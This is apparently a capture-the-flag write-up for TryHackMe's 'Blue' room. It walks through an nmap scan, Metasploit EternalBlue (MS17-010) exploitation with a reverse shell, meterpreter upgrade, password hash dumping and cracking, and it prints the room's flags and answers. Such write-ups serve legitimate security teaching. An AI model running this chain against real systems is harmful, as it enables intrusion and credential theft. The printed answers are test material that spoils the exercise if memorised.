# Blue

![alt text](https://github.com/rizbene/Writeups/blob/main/Tryhackme/Blue/Image/banner.png)

`Difficulty : Easy`

`Room :` [Blue](https://tryhackme.com/r/room/blue)

## Task 1 Recon

### • Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

> _No answer needed_

```
riz@kali:~$ sudo nmap -A -sS -T5 --script=vuln 10.10.14.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 20:58 WIB
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Warning: 10.10.14.146 giving up on port because retransmission cap hit (2).
Stats: 0:02:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 21:01 (0:00:21 remaining)
Stats: 0:05:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.90% done; ETC: 21:04 (0:00:00 remaining)
Nmap scan report for 10.10.14.146
Host is up (0.30s latency).
Not shown: 960 closed tcp ports (reset), 32 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  unknown
49154/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  unknown
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   394.84 ms 10.9.0.1
2   396.70 ms 10.10.14.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 348.17 seconds
```

### • How many ports are open with a port number under 1000?

> 3

```
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10
```

### • What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

> ms17-010

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

## Task 2 Gain Access

### • Start Metasploit

> _No answer needed_

### • Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

> _No answer needed_

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

### • Show options and set the one required value. What is the name of this value? (All caps for submission)

> RHOSTS

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.
                                             com/docs/using-metasploit/basics/using-metasploi
                                             t.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authent
                                             ication. Only affects Windows Server 2008 R2, Wi
                                             ndows 7, Windows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the specified userna
                                             me
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Tar
                                             get. Only affects Windows Server 2008 R2, Window
                                             s 7, Windows Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only
                                             affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, n
                                        one)
   LHOST     192.168.1.9      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

### • Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

### With that done, run the exploit!

> _No answer needed_

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.9.203.24:4444
[*] 10.10.14.146:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.14.146:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.14.146:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.14.146:445 - The target is vulnerable.
[*] 10.10.14.146:445 - Connecting to target for exploitation.
[+] 10.10.14.146:445 - Connection established for exploitation.
[+] 10.10.14.146:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.14.146:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.14.146:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.14.146:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.14.146:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.14.146:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.14.146:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.14.146:445 - Sending all but last fragment of exploit packet
[*] 10.10.14.146:445 - Starting non-paged pool grooming
[+] 10.10.14.146:445 - Sending SMBv2 buffers
[+] 10.10.14.146:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.14.146:445 - Sending final SMBv2 buffers.
[*] 10.10.14.146:445 - Sending last fragment of exploit packet!
[*] 10.10.14.146:445 - Receiving response from exploit packet
[+] 10.10.14.146:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.14.146:445 - Sending egg to corrupted connection.
[*] 10.10.14.146:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.14.146
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.36, but the operating system provides version 2.37.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
[+] 10.10.14.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.14.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.14.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (10.9.203.24:4444 -> 10.10.14.146:49219) at 2024-05-23 21:29:19 +0700


C:\Windows\system32>
```

### • Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

> _No answer needed_

```
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

## Task 3 Escalate

### • If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

> post/multi/manage/shell_to_meterpreter

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) >
```

### • Select this (use MODULE_PATH). Show options, what option are we required to change?

> SESSION

### • Set the required option, you may need to list all of the sessions to find your target here.

> _No answer needed_

### • Run! If this doesn't work, try completing the exploit from the previous task once more.

> _No answer needed_

### • Once the meterpreter shell conversion completes, select that session for use.

> _No answer needed_

### • Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

> _No answer needed_

### • List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

> _No answer needed_

### • Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

> _No answer needed_

## Task 4 Cracking

### • Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

> Jon

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

```
riz@kali:~$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:03 DONE (2024-05-23 22:38) 0.2949g/s 3008Kp/s 3008Kc/s 3008KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

`alqfna22`

### • Copy this password hash to a file and research how to crack it. What is the cracked password?

> alqfna22

## Task 5 Find flags!

```
meterpreter > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-18 02:26:36 +0700
c:\Windows\System32\config\flag2.txt  34            2019-03-18 02:32:48 +0700
c:\flag1.txt                          24            2019-03-18 02:27:21 +0700
```

### • Flag1? This flag can be found at the system root.

> flag{access_the_machine}

```
C:\Windows\system32>type c:\flag1.txt
type c:\flag1.txt
flag{access_the_machine}
```

### • Flag2? This flag can be found at the location where passwords are stored within Windows.

### \*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

> flag{sam_database_elevated_access}

```
C:\Windows\system32>type c:\Windows\System32\config\flag2.txt
type c:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
```

### • flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

> flag{admin_documents_can_be_valuable}

```
C:\Windows\system32>type c:\Users\Jon\Documents\flag3.txt
type c:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```
